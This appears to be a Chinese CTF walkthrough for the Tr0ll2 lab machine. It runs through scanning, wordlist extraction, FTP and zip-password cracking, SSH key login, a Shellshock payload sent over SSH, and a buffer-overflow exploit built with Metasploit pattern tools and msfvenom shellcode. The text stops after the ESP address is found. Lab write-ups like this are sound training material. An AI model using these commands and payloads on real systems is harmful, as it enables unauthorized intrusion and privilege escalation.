1、信息收集

1.1 主机探测

1、通过netdiscover检测主机IP地址

arp-scan 192.168.207.0/24

1.2 服务探测

1.通过nmap进行端口扫描

nmap -A -sS -sV -v -p- 192.168.207.149

查看开放21、22、80端口

2、渗透测试

2.1 WEB渗透

1.访问站点进行测试

2.网站测试

dirb http://192.168.207.148

发现robots.txt目录

访问robots.txt目录并进行查看

3.测试robots.txt目录文件

删除robots.txt目录中/,就行进行目录扫描，未发现有用信息

dirb http://192.168.207.149/ robots.txt

4.查看图片内容

wget http://192.168.207.149/dont_bother/cat_the_troll.jpg

tail -n 3 cat_the_troll.jpg

查看图片内容，提示 y0ur_self目录

5.访问目录查看

查看answer.txt文件，文件内容为base64编码

6.下载文件并解码

wget http://192.168.207.149/y0ur_self/answer.txt
base64 -d answer.txt > decode.txt

保存解码后的文件作为字典使用

7.FTP测试

由于FTP服务禁止匿名访问，查看上面提示用户

测试使用Tr0ll作为用户名和密码登录成功，下载lmao.zip文件

8.爆破压缩包密码

unzip lmao.zip

提示需要密码

fcrackzip -u -D -p decode.txt lmao.zip

爆破到密码为：ItCantReallyBeThisEasyRightLOL

解压文件，获取文件为noob

9.查看文件内容

查看文件内容为SSH的RSA

尝试使用密钥登录，提示连接失败

chmod 600 noob
ssh -i noob noob@192.168.207.149

10.尝试使用shellshock漏洞

ssh -i noob noob@192.168.207.149 '() ( : ;}; /bin/bash'

可以执行shellshock漏洞

2.2 主机渗透


1.获取shell终端

python -c 'import pty; pty.spawn("/bin/bash")'

find / -perm -4000 2>/dev/null


2.查看r00t文件

在文件测试过程中，执行完毕后操作系统会自动重启


3.测试door2文件夹文件

./r00t $(python -c 'print "A" * 200')


4.使用gdb进行调试

gdb -q ./r00t

通过字符串来查找缓冲区大小

/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500


5.输入调试环境中

发现EIP 寄存器被 0x6a413969覆盖

获取偏移量

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6a413969


6.使用msf创建shell

msfvenom --platform linux -p linux/x86/exec -f py CMD="/bin/sh" -b '\x00\x0a\x0d' -a x86

查看ESP位置

i r esp

获取到ESP位置为：0xbffffaa0
